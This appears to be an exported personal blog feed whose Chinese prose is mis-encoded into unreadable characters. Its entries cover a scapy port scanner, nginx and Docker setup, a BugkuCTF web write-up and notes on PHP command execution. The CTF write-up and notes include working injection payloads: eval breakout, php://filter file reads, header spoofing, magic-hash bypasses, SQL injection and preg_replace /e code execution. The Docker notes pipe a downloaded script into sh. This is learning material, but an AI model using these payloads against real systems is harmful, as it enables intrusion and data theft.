    <content type="text"><![CDATA[å‡†å¤‡äº‹å®œscapyåº“git clone https://github.com/secdev/scapy.gitcd ./scapypython setup.py æ„æ€ æ”¾ä¸ªä¸‰æ¬¡æ¡æ‰‹åŸç†å›¾ä¸è¢«æ‰«ææœºè¿›è¡ŒSYNæ¡æ‰‹ï¼Œè¿”å›æ•°æ®åŒ…ä¸å¸¦ RST æ ‡è¯†å°±æ˜¯å¼€æ”¾äº†ç«¯å£åŸºæœ¬æ€è·¯å‚è€ƒ scapyå®˜æ–¹æ–‡æ¡£ å¦‚ä½•ç”¨Scapyå†™ä¸€ä¸ªç«¯å£æ‰«æå™¨ï¼Ÿ Pythonçš„æ— çŠ¶æ€SYNå¿«é€Ÿæ‰«æ å®Œæ•´çš„é¡¹ç›®æˆ‘æ”¾åˆ°äº†githubä¸Š è¿™é‡Œ é¢„å®šä¹‰çš„å…¨å±€å˜é‡#ç›®æ ‡ipä¸ç«¯å£ports = ''target = ''#å®šä¹‰æ˜¯å¦ç”¨socketæ‰«æï¼Œé»˜è®¤ç”¨synsocket_scan_mode = False#åˆè®¡socketæ‰«åˆ°ç«¯å£socket_flag = 0# Pn = True# socketæ‰«æå¤šçº¿ç¨‹é”lock = threading.Semaphore(value=1)#é»˜è®¤æ‰«æçš„ç«¯å£default_ports = [...]#ç«¯å£å¯èƒ½å¯¹åº”çš„æœåŠ¡port_list = &#123;...&#125; getoptæ¨¡å—å¤„ç†ç”¨æˆ·è¾“å…¥def usage(): #ç”¨æ³•æç¤º print "Usage: pineScan.py -t target_host (-p)" print " -h --help" print " -t --target" print " example: -t 127.0.0.1" print " -p --port" print " example: -p 80,445" print " -s --socket" #print " -Pn --skip host discovery" def init(): global ports global target global socket_scan_mode try: #å¯¹ç”¨æˆ·è¾“å…¥çš„å‚æ•°è§£æ opts, args = getopt.getopt(sys.argv[1:],"hp:t:s",["help","port","target","socket"]) for o,a in opts: if o in ("-h","--help"): usage() exit(0) elif o in ("-t","--target"): target = a elif o in ("-p","--port"): ports = a elif o in ("-s","--socket"): socket_scan_mode = True elif o in ("-Pn"): Pn = True else: print "Unhandled Option" exit(0) if target: #è°ƒç”¨æ‰«æ portScan(target, ports) else: usage() exit(0) except Exception as e: print str(e) print usage() socketæ‰«ææ ¸å¿ƒä»£ç socketæ‰«æå†™éƒ½å†™äº†ï¼Œæ‡’å¾—åˆ äº†â€¦emmmmdef socket_scan(target, port): #socketå…¨è¿æ¥ global socket_flag try: conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM) #è®¾ç½®è¶…æ—¶ conn.settimeout(2) conn.connect((target, port)) lock.acquire() print '[*] %d/tcp open %s\r' % (port,port_list[port]) #è®¡ç®—å¼€å¯çš„ç«¯å£ socket_flag = socket_flag + 1 except: #çº¿ç¨‹é‡Šæ”¾ lock.release() conn.close() synæ‰«ææ ¸å¿ƒä»£ç def syn_scan(ip,ports): #æ„é€ æ•°æ®åŒ… ans,unans=sr(IP(dst=ip)/TCP(dport=ports, flags='S'),timeout = 5) print "PORT STATE SERVICE" for snd,rcv in ans: #ä»è¿”å›åŒ…è¯»å–æ•°æ® port = rcv.sprintf("%IP.sport%") service = rcv.sprintf("%TCP.sport%") flag = rcv.sprintf("%TCP.flags%") if flag == 'SA': #SAæ˜¯å¼€æ”¾äº†ç«¯å£ if is_number(service): #åŒ…ä¸­ä¿¡æ¯çš„è¯»å–è‹¥ä¸ºæ•°å­—ï¼Œè°ƒç”¨å­—å…¸æŸ¥è¯¢å¯èƒ½çš„å¯¹åº”æœåŠ¡å¹¶æ›¿æ¢ if service in port_list.keys(): service = port_list[service] else: service = 'unknown' #æ ¼å¼åŒ–è¾“å‡º print '%-10.5sopen %s' % (port,service) æ‰«æè°ƒç”¨æ¨¡å—#ä»¥é€—å·åˆ†å‰²ç«¯å£å·ports = ports.split(",")#å¯¹stringç±»å‹åˆ—è¡¨å¤„ç†æˆintç±»å‹ports = [int(i) for i in ports]#åˆ¤æ–­æ˜¯socketæ‰«æè¿˜æ˜¯synæ‰«æif socket_scan_mode: for port in ports: #å¤šçº¿ç¨‹è°ƒç”¨socket thread = threading.Thread(target=socket_scan, args=(target, int(port))) thread.start() if socket_flag == 0: print "socket scan done!but no port is open"else: #synä¸­æ•´ä¸ªåˆ—è¡¨ä¼ è¾“æ‰§è¡Œæ¯”forå¾ªç¯æ›´å¿« syn_scan(target,ports) å®é™…ç»“æœå±•ç¤ºè¿˜ç®—å¯ä»¥ï¼ŒæŠ€æœ¯æ‰€é™ï¼Œå¤§ä½¬è½»å–·]]></content>
      <categories>
        <category>ç¼–ç¨‹ä¹‹é“</category>
      </categories>
      <tags>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[å°ç«™è¿ç§»è®°(Nginxè‡ªåŠ¨åŒ–éƒ¨ç½²)]]></title>
    <url>%2F2018%2F11%2F09%2Fweb-migration%2F</url>
    <content type="text"><![CDATA[SSHéƒ¨ç½²é˜¿é‡Œäº‘vpsç›´æ¥åœ¨é˜¿é‡Œäº‘æ§åˆ¶å°å¯¼å…¥ssh-keygenç”Ÿæˆçš„ç§˜é’¥ç§˜é’¥ç”Ÿæˆçœ‹è¿™é‡Œssh git@serverip -i ~/.ssh/id_rsa å®‰è£…nginx apt-get updateapt-get install nginx/etc/init.d/nginx start è®¿é—®ip,çœ‹åˆ°Welcome to nginx! é…ç½®æˆåŠŸäº† å®‰è£…Gitsudo apt-get install git#åˆ›å»ºä¸€ä¸ªgitç”¨æˆ·,ç”¨äºè¿è¡ŒgitæœåŠ¡sudo adduser git#å¯¼å…¥ç§˜é’¥åˆ°/home/git/.ssh/authorized_keys#ä¿®æ”¹æƒé™chmod 600 authorized_keys#åˆå§‹åŒ–gitä»“åº“git init --bare blo.git#æ›´æ”¹æ‰€æœ‰æƒsudo chown -R git:git blog.git#ç¦æ­¢shellç™»å½•ä¿®æ”¹/etc/passwdçš„git:x:1003:1003::/home/git:/bin/bashæ”¹ä¸ºgit:x:1003:1003::/home/git:/usr/bin/git-shell#å…‹éš†è¿œç¨‹ä»“åº“git clone git@serverip:/home/git/blog.git é…ç½®nginxæ‡’çš„é…äº†,ç›´æ¥æŠŠhtmlåˆ äº†git clone /home/git/blog.git html ä»ä»“åº“å…‹éš†è¿‡æ¥ç›´æ¥æ›¿æ¢æ‰ é…ç½®Gité’©å­hooksblog.gitæ–‡ä»¶å®¶é‡Œæœ‰ä¸€ä¸ªhooksæ–‡ä»¶å¤¹é‡Œè¾¹æœ‰å„ç§hookä¾‹å­$ vim blog.git/hooks/post-receive å†™å¦‚ä¸‹ä»£ç #!/bin/shunset GIT_DIR #è¿˜åŸç¯å¢ƒå˜é‡ï¼Œå¦åˆ™ä¼šæ‹‰ä¸åˆ°ä»£ç cd /var/www/htmlgit pull origin master æ³¨æ„è¦chmod 755 blog.git/hooks/post-receive æµ‹è¯•æœ¬åœ°ä¿®æ”¹hexoé…ç½®æ–‡ä»¶deploy: type: git # éƒ¨ç½²åˆ°æˆ‘çš„gitä»“åº“ repo: git@serverip:/home/git/blog.git # åˆ†æ”¯é»˜è®¤master branch: master sshå‚è€ƒ nginxå®‰è£…å‚è€ƒ nginxé…ç½®å‚è€ƒ GitæœåŠ¡å™¨æ­å»ºå‚è€ƒ è¯¦ç»†å‚è€ƒ]]></content>
      <categories>
        <category>æ‚ä¸ƒæ‚å…«</category>
      </categories>
      <tags>
        <tag>web</tag>
        <tag>vps</tag>
        <tag>nginx</tag>
        <tag>ssh</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Dockerä»å…¥é—¨åˆ°æ”¾å¼ƒ]]></title>
    <url>%2F2018%2F10%2F28%2Fdocker-1%2F</url>
    <content type="text"><![CDATA[docker dockerä¸‰å¤§æ ¸å¿ƒ: é•œåƒ -é•œåƒä¸å¯å†™ å®¹å™¨ -å®¹å™¨åŸºäºé•œåƒç”Ÿæˆ(å¯å†™) ä»“åº“ -ä»“åº“å­˜å‚¨é•œåƒ(ç±»ä¼¼äºGitçš„ç®¡ç†æœºåˆ¶) dockerçš„å®‰è£…wget -qO- https://get.docker.com/ | sh å®‰è£…å®Œå,å°†dockerè´¦æˆ·æ·»åŠ åˆ°ç”¨æˆ·ç»„(éroot)ä»¥ä¾¿æ‰§è¡Œ,ç„¶åç™»å‡ºå†ç™»å½•å¦åˆ™ä¼šæŠ¥no permission sudo groupadd dockersudo gpasswd -a $&#123;USER&#125; dockersudo service docker restartnewgrp - docker #å¯åŠ¨dockersudo service docker start #æµ‹è¯•dockerdocker run hello-world èœé¸Ÿæ•™ç¨‹ å¸¸ç”¨å‘½ä»¤# æœç´¢é•œåƒdicker search centos# ä¸‹è½½é•œåƒdocker pull name# -t ç»‘å®šä¼ªç»ˆç«¯ -i ä¿æŒæ ‡å‡†è¾“å…¥ -d åå°è¿è¡Œ -p ç«¯å£æ˜ å°„docker run -t -i -p 1000:80 docker.io/centos /bin/bash# å±•ç¤ºæ‰€æœ‰é•œåƒdocker images# ä¿å­˜é•œåƒdocker save -o centos7.tar docker.io/centos# è½½å…¥é•œåƒdocker load --input centos7.tar# ä¿å­˜å®¹å™¨docker export id &gt; name.tar# è½½å…¥å®¹å™¨æˆä¸ºé•œåƒcat name.tar | docker import - sherdh/ubuntu:v1.0# æŸ¥çœ‹æ­£åœ¨è¿è¡Œçš„å®¹å™¨(æ‰€æœ‰)docker ps ï¼ˆ-aï¼‰# å¯åŠ¨/ç»ˆæ­¢å®¹å™¨docker start/stop id (-i)# åˆ é™¤é•œåƒdocker rmi id# åˆ é™¤å®¹å™¨docker rm id é‚£äº›æŠ˜è…¾ç¬¬ä¸€å‘ä¸è¦å¼ºåˆ¶åˆ é™¤ä¸€ä¸ªå­˜åœ¨å®¹å™¨ä¾èµ–çš„é•œåƒå³ -f ,å› ä¸ºä¼šäº§ç”Ÿå„ç§è«åå…¶å¦™çš„é—®é¢˜å…ˆåˆ é™¤å®¹å™¨,å¦‚æœå®¹å™¨åœ¨è¿è¡Œï¼Œéœ€è¦å…ˆåœæ­¢#æŸ¥çœ‹æ‰€æœ‰å®¹å™¨docker ps -adocker rm å®¹å™¨id åˆ›å»ºé•œåƒåŸºäºå·²æœ‰å®¹å™¨docker commit -a "test" -m "add a new file" å®¹å™¨id test(æ–°é•œåƒåå­—) æ³¨æ„æ˜¯å®¹å™¨idï¼Œä¸æ˜¯é•œåƒid åŠ tagdocker tag test:latest test/test:latest åŠ äº†tagåï¼Œæœ‰ä¸¤ä¸ªåŒidçš„imagesè¿™æ—¶åˆ é™¤é•œåƒæŠ¥é”™Error response from daemon: conflict: unable to delete c30eab908457 (must be forced) - image is referenced in multiple repositories åˆ é™¤æ—¶éœ€è¦æŒ‡å®šåå­—ï¼Œè€Œä¸æ˜¯id è¿è¡ŒæŠ¥é”™standard_init_linux.go:178: exec user process caused â€œexec format errorâ€æŸ¥åˆ°åŸå› æ˜¯dockerä¸æ”¯æŒ32ä½ubuntuâ€¦ä¹–ä¹–é‡è£…ç³»ç»Ÿå» ä½¿ç”¨dockerfileåˆ›å»ºé•œåƒFROM ubuntuMAINTAINER test test@gmail.comRUN echo "deb http://archive.ubuntu.com/ubuntu/ raring main universe" &gt;&gt; /etc/apt/sources.listRUN apt-get update &amp;&amp; apt-get install -y nginx inotify-tools apache2 openssh-serverRUN echo "\ndaemon off;" &gt;&gt; /etc/nginx/nginx.conf# è‡ªå¯åŠ¨RUN bash -c 'echo "firefox" &gt;&gt; /.bashrc'# æ‰“å¼€ç«¯å£EXPOSE 5900# å®¹å™¨å¯åŠ¨æ‰§è¡Œçš„å‘½ä»¤CMD /usr/sbin/nginx]]></content>
      <categories>
        <category>æ‚ä¸ƒæ‚å…«</category>
      </categories>
      <tags>
        <tag>docker</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[BugkuCTF-write-up(WEBé¢˜)]]></title>
    <url>%2F2018%2F09%2F28%2FBugkuCTF-write-up%2F</url>
    <content type="text"><![CDATA[å…ˆæ”¾å‡ºbugkuctfç½‘å€:click me web2 è¿›å»ä¸€å¤§ç‰‡çš„æ»‘ç¨½,é€Ÿåº¦è¿˜è¶Šæ¥è¶Šå¿«f12çœ‹ä¸€ä¸‹ï¼Œå—¯ï¼Œå¾—flag è®¡ç®—å™¨è¦æ±‚è¾“å…¥ä¸¤ä¸ªä¸€ç™¾ä»¥å†…æ•°å­—ç›¸åŠ çš„ç»“æœï¼Œè¾“å…¥æ¡†é™äº†é•¿åº¦å®¡æŸ¥å…ƒç´ æ›´æ”¹maxlength,æäº¤å¾—flag webåŸºç¡€$_GETæ˜¾ç¤ºäº†ä»¥ä¸‹ä»£ç $what=$_GET['what'];echo $what;if($what=='flag')echo 'flag&#123;****&#125;'; ç”¨getä¼ å€¼what=flag webåŸºç¡€$_POST$what=$_POST['what'];echo $what;if($what=='flag')echo 'flag&#123;****&#125;'; æ‰“å¼€hackbarpostæ•°æ®what=flag çŸ›ç›¾$num=$_GET['num'];if(!is_numeric($num))&#123;echo $num;if($num==1)echo 'flag&#123;**********&#125;';&#125; è¦æ±‚num=1å´ä¸æ˜¯æ•°å­—phpç‰¹æ€§ï¼Œæäº¤1a (éšä¾¿åŠ ä¸ªå­—æ¯) web3æ— é™å¼¹çª—flagå°±åœ¨è¿™é‡Œâ€¦æŠ“åŒ…çœ‹ä¸€ä¸‹htmlå®ä½“ç¼–ç ï¼Œè§£ä¸€ä¸‹ åŸŸåè§£æhint:å¬è¯´æŠŠ flag.bugku.com è§£æåˆ°120.24.86.145 å°±èƒ½æ‹¿åˆ°flagä¹‹å‰æ˜¯è‡ªå·±å‚»xäº†â€¦./etc/hosts é‡ŒåŠ ä¸ª123.206.87.240 flag.bugku.comå°±å¥½äº† ä½ å¿…é¡»è®©ä»–åœä¸‹ç–¯ç‹‚åˆ·æ–°â€¦..æŠ“åŒ…æ‹¦æˆªå¾—flag æœ¬åœ°åŒ…å« &lt;?php include "flag.php"; $a = @$_REQUEST['hello']; eval( "var_dump($a);"); show_source(__FILE__);?&gt; æ„é€ é—­åˆç¬¦å·å°±å¥½äº†hello=); show_source(flag.php æ²¡ååº”ï¼Œå°´å°¬hello=); print(flag.php æµ‹è¯•ä¸€ä¸‹è¾“å‡ºäº†flagphpï¼Œwtfï¼Ÿè¿‡æ»¤äº†.æ¢ä¸ªæ€è·¯hello=);print_r(file("flag.php") å˜é‡1flag In the variable ! &lt;?php error_reporting(0);include "flag1.php";highlight_file(__file__);if(isset($_GET['args']))&#123; $args = $_GET['args']; if(!preg_match("/^\w+$/",$args))&#123; die("args error!"); &#125; eval("var_dump($$args);");&#125;?&gt; ä»¥ä¸ºåˆæ˜¯ç»•è¿‡ï¼Œè€—äº†å¥½äº›æ—¶é—´â€¦.åæ¥å‘ç°$$phpå…¨å±€å˜é‡GLOBALSï¼Œ$GLOBALSå¯ä»¥è°ƒç”¨ï¼Œæœæ–­?args=GLOBALSget it web5hint1:jspfuckhint2:å¤§å†™f12çœ‹åˆ°æ˜¯jsfuckï¼Œæ§åˆ¶å°é»è´´å›è½¦ å¤´ç­‰èˆ±ä»€ä¹ˆä¹Ÿæ²¡æœ‰ï¼Ÿï¼Ÿï¼ŸæŠ“åŒ…çœ‹çœ‹,æœ‰ç‚¹æ„æ€flagåœ¨æ¶ˆæ¯å¤´ ç½‘ç«™è¢«é»‘å—¯..ä¸€ä¸ªé»‘é¡µï¼Œç¿»äº†ç¿»ä»€ä¹ˆéƒ½æ²¡æœ‰ä¸Šç›®å½•æ‰«æå™¨(æˆ‘è¿™é‡Œç”¨dirsearch)ç”¨å¾¡å‰‘çš„äººä¼šæ¯”è¾ƒå¤šæ‰«åˆ°ä¸ªé©¬,å…ˆè®¿é—®çœ‹çœ‹ï¼Œè¦è¾“å¯†ç ï¼Œéšä¾¿è¾“ä¸€ä¸ªè¯•è¯•æç¤ºä¸æ˜¯è‡ªå·±çš„é©¬ä¸è¦ä¹±éª‘â€¦æœ‰ç‚¹æ„æ€æ‹¿burpæŒ‚ä¸ªå­—å…¸ç›´æ¥çˆ†ç ´â€¦ ç®¡ç†å‘˜ç³»ç»Ÿç™»å½•æ¡†emmmm,è¯•è¯•ä¸‡èƒ½å¯†ç è®°å½•ipï¼Œè¿˜çœŸæœ‰ç‚¹å°æ€•æ€•å‘¢~æ’ä¸ªX-Forwarded-For: 123.206.31.85ä¸æŠ¥ç¦æ­¢è®¿é—®äº†ï¼Œç„¶å?å¡äº†ä¸€ä¼šï¼Œf12çœ‹ä¸€ä¸‹æœ‰ä¸ªæ³¨é‡ŠdGVzdDEyMw== æ˜¯base64ï¼Œè§£ç test123ç›®æµ‹æ˜¯å¯†ç ï¼Œé‚£ç”¨æˆ·åå‘¢?admin?root?administrator?éƒ½ä¸æ˜¯?ä¸å¯¹ï¼Œæ¢ä¸ªæ€è·¯ï¼Œæ”¹X-Forwarded-For: 192.168.1.1å†æ”¹127.0.0.1æˆäº†ï¼Œå’‹å°±å¿˜äº†è¿™ä¸ªå‘¢â€¦.å°´å°¬ web4uslè§£ç çœ‹çœ‹ï¼Œä¹±ä¸ƒå…«ç³Ÿï¼Œç†ä¸€ä¸‹æ ¼å¼function checkSubmit()&#123; var a=document.getElementById("password"); if("undefined"!=typeof a)&#123; if("67d709b2b54aa2aa648cf6e87a7114f1"==a.value) return!0; alert("Error"); a.focus(); return!1 &#125;&#125;document.getElementById("levelQuest").onsubmit=checkSubmit;eval(unescape(p1) + unescape('%35%34%61%61%32' + p2)); æ‰‹åŠ¨æ‹¼æ¥å†è§£ç æäº¤67d709b2b54aa2aa648cf6e87a7114f1 flagåœ¨indexé‡Œclick me.ç‚¹ä¹‹ï¼Œè·³è½¬urlæœ‰ä¸œè¥¿http://120.24.86.145:8005/post/index.php?file=show.php æ˜¯æ–‡ä»¶åŒ…å«ï¼Œç›´æ¥filteråè®®è¯»index.php?file=php://filter/read=convert.base64-encode/resource=index.php çœ‹åˆ°äº†â€™//flag:flag{edulcni_elif_lacol_si_siht}â€™ è¾“å…¥å¯†ç æŸ¥çœ‹flag120.24.86.145:8002/baopo/æ—¢ç„¶éƒ½å†™å¾—è¿™ä¹ˆæ˜æ˜ç™½ç™½çš„çˆ†ç ´äº†é‚£å°±çˆ†ç ´å§äº”ä½æ•°æ•°å­—ï¼Œè¦ä¸äº†å¤šä¹…ç¬¬ä¸€æ¬¡æ²¡çˆ†å‡ºæ¥ï¼Ÿï¼Ÿï¼Ÿæ˜¯è‡ªå·±å‚»é€¼äº†ï¼Œè°ƒäº†5é€’å¢â€¦å†çˆ†ä¸€æ¬¡ ç‚¹å‡»ä¸€ç™¾ä¸‡æ¬¡hints:javascriptf12çœ‹ä¸€ä¸‹var clicks=0$(function() &#123; $("#cookie") .mousedown(function() &#123; $(this).width('350px').height('350px'); &#125;) .mouseup(function() &#123; $(this).width('375px').height('375px'); clicks++; $("#clickcount").text(clicks); if(clicks &gt;= 1000000)&#123; var form = $('&lt;form action="" method="post"&gt;' + '&lt;input type="text" name="clicks" value="' + clicks + '" hidden/&gt;' + '&lt;/form&gt;'); $('body').append(form); form.submit(); &#125; &#125;);&#125;); ä»£ç éƒ½åœ¨è¿™é‡Œæ€ä¹ˆæ”¹éƒ½è¡Œäº†å¤§äº1000000å°±postä¸ªè¡¨å•ã€‚ã€‚æˆ‘å¹²è„†æ„é€ ä¸€ä¸ªpostè¡¨å•æäº¤å°±å¥½äº† å¤‡ä»½æ˜¯ä¸ªå¥½ä¹ æƒ¯å¤‡ä»½ï¼Œå…¸å‹çš„æºç æ³„éœ²ç›´æ¥è®¿é—®index.php.bakä¸‹è½½ä¸‹æ¥çœ‹ä¸€ä¸‹&lt;?php/** * Created by PhpStorm. * User: Norse * Date: 2017/8/6 * Time: 20:22*/include_once "flag.php";ini_set("display_errors", 0);$str = strstr($_SERVER['REQUEST_URI'], '?');$str = substr($str,1);$str = str_replace('key','',$str);parse_str($str);echo md5($key1);echo md5($key2);if(md5($key1) == md5($key2) &amp;&amp; $key1 !== $key2)&#123; echo $flag."å–å¾—flag";&#125; md5ç›¸ç­‰ï¼Œå€¼ä¸ç­‰ã€‚ã€‚phpéšå¼è½¬æ¢çš„ç¼ºé™·ï¼ŒPHPåœ¨å¤„ç†å“ˆå¸Œå­—ç¬¦ä¸²æ—¶ï¼Œä¼šåˆ©ç”¨â€!=â€æˆ–â€==â€æ¥å¯¹å“ˆå¸Œå€¼è¿›è¡Œæ¯”è¾ƒï¼Œå®ƒæŠŠæ¯ä¸€ä¸ªä»¥â€0Eâ€å¼€å¤´çš„å“ˆå¸Œå€¼éƒ½è§£é‡Šä¸º0æ‰€ä»¥å¦‚æœä¸¤ä¸ªä¸åŒçš„å¯†ç ç»è¿‡å“ˆå¸Œä»¥åï¼Œå…¶å“ˆå¸Œå€¼éƒ½æ˜¯ä»¥â€0Eâ€å¼€å¤´çš„ï¼Œé‚£ä¹ˆPHPå°†ä¼šè®¤ä¸ºä»–ä»¬ç›¸åŒï¼Œéƒ½æ˜¯0240610708å’ŒQNKCDZOä½†è¿˜æ˜¯æœ‰ä¸€ä¸ªå‘str_replaceè¿‡æ»¤äº†keyhttp://120.24.86.145:8002/web16/index.php?kekeyy1=240610708&amp;&amp;kekeyy2=QNKCDZO æˆäº† æˆç»©å•å—¯ï¼Œsqlæ³¨å…¥1' or 1=1# ä¸æŠ¥é”™ã€‚unionæŸ¥è¯¢å’Œæ—¶é—´ç›²æ³¨ä¸¢åˆ°sqlmapç›´æ¥è·‘ ç§‹åå±±è€å¸æœºå†™ä¸ªå°jioæœ¬å§â€¦.# !/usr/bin/env python# coding:utf-8import requestsfrom lxml import htmlimport reurl = 'http://123.206.87.240:8002/qiumingshan/'requests = requests.Session()rs = requests.get(url)rs = html.fromstring(rs.content)rs = str(rs.xpath('//div/text()'))rs = eval(rs[2:-5])data=&#123; 'value': rs&#125;rs = requests.post(url,data=data)print rs.content å¦‚æœå€¼åä¸å¯¹ä¼šæç¤ºç”¨value:Give me value post aboutâ€¦. åŸæ¥ä½ ä¹Ÿæ˜¯è€å¸æœº Bugku{YOU_DID_IT_BY_SECOND}[Finished in 0.9s] é€Ÿåº¦è¦å¿«hint:æ ¼å¼KEY{xxxxxxxxxxxxxx}æ•°æ®åŒ…é‡Œæœ‰ä¸œè¥¿çœ‹ç€åƒbase64ï¼Œè§£ç æŒ‰ç…§æç¤ºPOSTä¸€ä¸ªå‚æ•°margin=WQpzogT0RJek9EVXc=æç¤ºè®©å¿«ç‚¹ï¼Œè„šæœ¬ä¾å€™ï¼Œä¸è¡ŒåŠ ä¸ªè§£ç # !/usr/bin/env python#-*-coding:utf-8-*-import requestsimport base64url = "http://123.206.87.240:8002/web6/"session = requests.Session()rs = session.get(url).headers['flag']flag = base64.b64decode(base64.b64decode(rs).split(':')[1])payload = &#123;'margin':flag&#125;rs = session.post(url,payload)print rs.content cookiesæ¬ºéª—åˆšå¼€å§‹è¿˜ä»¥ä¸ºçœŸæcookieå®é™…ä¸Šæ˜¯æ–‡ä»¶åŒ…å«æ³„æ¼ä¸»é¡µæºç è¯·æ±‚urlå‚æ•°ç»è¿‡base64ç¼–ç ï¼Œè§£ç å‘ç°æ˜¯keys.txt,æŠŠindex.phpç¼–ç ä¸€ä¸‹/web11/index.php?line=&amp;filename=aW5kZXgucGhw åªæœ‰ä¸€è¡Œï¼Œæ³¨æ„åˆ°lineå‚æ•°# !/usr/bin/env python#-*-coding:utf-8-*-import requestsimport base64for i in xrange(0,20): url = "http://123.206.87.240:8002/web11/index.php?line="+str(i)+"&amp;filename=aW5kZXgucGhw" rs = requests.get(url) print rs.text å¾ªç¯è¯»ä¸€ä¸‹æºç &lt;?phperror_reporting(0);$file=base64_decode(isset($_GET['filename'])?$_GET['filename']:"");$line=isset($_GET['line'])?intval($_GET['line']):0;if($file=='') header("location:index.php?line=&amp;filename=a2V5cy50eHQ=");$file_list = array( '0' =&gt;'keys.txt', '1' =&gt;'index.php',);if(isset($_COOKIE['margin']) &amp;&amp; $_COOKIE['margin']=='margin')&#123; $file_list[2]='keys.php';&#125;if(in_array($file, $file_list))&#123; $fa = file($file); echo $fa[$line];&#125;?&gt; è¿™ä¸‹åå‰¯å…¶å®cookieæ¬ºéª—äº†]]></content>
      <categories>
        <category>CTF</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[å‘½ä»¤æ‰§è¡Œé‚£äº›äº‹]]></title>
    <url>%2F2018%2F09%2F09%2Fsafe-command-exec%2F</url>
    <content type="text"><![CDATA[å‘½ä»¤æ‰§è¡Œå®šä¹‰ä½¿ç”¨æ‰§è¡Œç³»ç»Ÿå‘½ä»¤çš„å‡½æ•°æ—¶ï¼Œæ²¡æœ‰è¿›è¡Œè¿‡æ»¤ ç»§æ‰¿webæœåŠ¡å™¨æƒé™ å‘½ä»¤æ‰§è¡Œç›¸å…³å‡½æ•° system(è¿”å›æœ€åä¸€è¡Œ) exec passthru(è¿”å›æœ€åä¸€è¡Œ) shell_exec ä½œç”¨ä¸ åå¼•å·ä¸€è‡´ popen(è¿”å›æ–‡ä»¶æŒ‡é’ˆ) proc_open(è¿”å›æ–‡ä»¶æŒ‡é’ˆ) pcntl_exec å¤šè¿›ç¨‹å¤„ç†æ‰©å±•,éœ€é¢å¤–å®‰è£… (string $path, array $args, array $envs) &lt;?php $w = 'whoami'; system($w); passthru($w); echo '&lt;br/&gt;'.'exec:'.exec($w).'&lt;br/&gt;'; echo 'shell_exec:'.shell_exec($w).'&lt;br/&gt;'; echo `$w`; echo popen('whoami','r'); //(cmd,mode[r,w])//è¯»å’Œå†™ proc_open('proc_open:'.$w).'&lt;br/&gt;'; pcntl_exec('pcntl_exec:'.$w).'&lt;br/&gt;';?&gt; å‘½ä»¤æ‰§è¡Œé˜²å¾¡å‡½æ•° escapeshellarg() //è½¬ä¹‰å‚æ•° å°†å¼•å·æ›¿æ¢ä¸ºç©ºæ ¼ escapeshellcmd() //è¿‡æ»¤æ•´æ¡å‘½ä»¤(winä¸‹åŠ ^ linuxåŠ \) echo 'ls '.escapeshellarg('a"'); è¿‡æ»¤å­—ç¬¦æœ‰&amp; ; ` | * ? ~ &lt; &gt; ^ ( ) [ ] &#123; &#125; $ \ \x0A \xFF %' " åœ¨ä¸æˆå¯¹æƒ…å†µä¸‹ä¹Ÿè¿‡æ»¤ ä»£ç æ‰§è¡Œç›¸å…³å‡½æ•° eval assert preg_replace (php&lt;=5.5) call_user_func call_user_func_array array_map å‰ä¸¤ä¸ªå°±ä¸è¯´äº†ï¼Œä¸€å¥è¯å¸¸è§ - preg_replace ( mixed pattern, mixed replacement, mixed subject [, int limit])//æœç´¢subjectä¸­åŒ¹é…patternçš„éƒ¨åˆ†ï¼Œ ä»¥replacementè¿›è¡Œæ›¿æ¢ã€‚//å½“ç¬¬ä¸€ä¸ªå‚æ•°çš„æ­£åˆ™è¡¨è¾¾å¼æœ‰eä¿®æ­£ç¬¦çš„æ—¶å€™ï¼Œç¬¬äºŒä¸ªå‚æ•°çš„å­—ç¬¦ä¸²å½“åšPHPä»£ç æ‰§è¡Œ &lt;?php//?cmd=phpinfo()preg_replace(â€œ/test/eâ€,$_GET["cmd"],â€jutsttestâ€);?&gt; //?value=[phpinfo()]preg_replace('/\[(.*)\]/e', 'strtolower("\\1")', $_GET['value']);//strtolower("\\1")å®é™…å°±æ˜¯\1 è€Œ\1åœ¨æ­£åˆ™ä¸­æœ‰è‡ªå·±çš„å«ä¹‰ åå‘å¼•ç”¨ å¯¹ä¸€ä¸ªæ­£åˆ™è¡¨è¾¾å¼æ¨¡å¼æˆ–éƒ¨åˆ†æ¨¡å¼ ä¸¤è¾¹æ·»åŠ åœ†æ‹¬å· å°†å¯¼è‡´ç›¸å…³ åŒ¹é…å­˜å‚¨åˆ°ä¸€ä¸ªä¸´æ—¶ç¼“å†²åŒº ä¸­ï¼Œæ‰€æ•è·çš„æ¯ä¸ªå­åŒ¹é…éƒ½æŒ‰ç…§åœ¨æ­£åˆ™è¡¨è¾¾å¼æ¨¡å¼ä¸­ä»å·¦åˆ°å³å‡ºç°çš„é¡ºåºå­˜å‚¨ã€‚ç¼“å†²åŒºç¼–å·ä» 1 å¼€å§‹ï¼Œæœ€å¤šå¯å­˜å‚¨ 99 ä¸ªæ•è·çš„å­è¡¨è¾¾å¼ã€‚æ¯ä¸ªç¼“å†²åŒºéƒ½å¯ä»¥ä½¿ç”¨ â€˜\nâ€™ è®¿é—®ï¼Œå…¶ä¸­ n ä¸ºä¸€ä¸ªæ ‡è¯†ç‰¹å®šç¼“å†²åŒºçš„ä¸€ä½æˆ–ä¸¤ä½åè¿›åˆ¶æ•°ã€‚ æ·±å…¥ç ”ç©¶preg_replace æ‰€ä»¥è¿™é‡Œçš„ \1 å®é™…ä¸ŠæŒ‡å®šçš„æ˜¯ç¬¬ä¸€ä¸ªå­åŒ¹é…é¡¹,å³valueä¸­ç¬¬ä¸€ä¸ªå­åŒ¹é…é¡¹,è¾¾åˆ°ä»£ç æ‰§è¡Œç›®çš„ - call_user_func()- call_user_func_array()- array_map() //è°ƒç”¨å…¶ä»–å‡½æ•°åŠŸèƒ½//ç¬¬ä¸€ä¸ªå‚æ•°ä¸ºå›è°ƒå‡½æ•°,åé¢çš„å‚æ•°ä¸ºå›è°ƒå‡½æ•°çš„å‚æ•°$b = 'phpinfo()';call_user_func($_GET['a'], $b);//å½“?a=evalæ—¶å°±è°ƒç”¨äº†evalå‡½æ•°è€Œphpinfo()ä½œä¸ºå‚æ•° å‘½ä»¤æ‰§è¡Œå¸¸ç”¨ç¬¦ Windowsæ”¯æŒçš„ç®¡é“ç¬¦| ç›´æ¥æ‰§è¡Œåè¾¹çš„|| 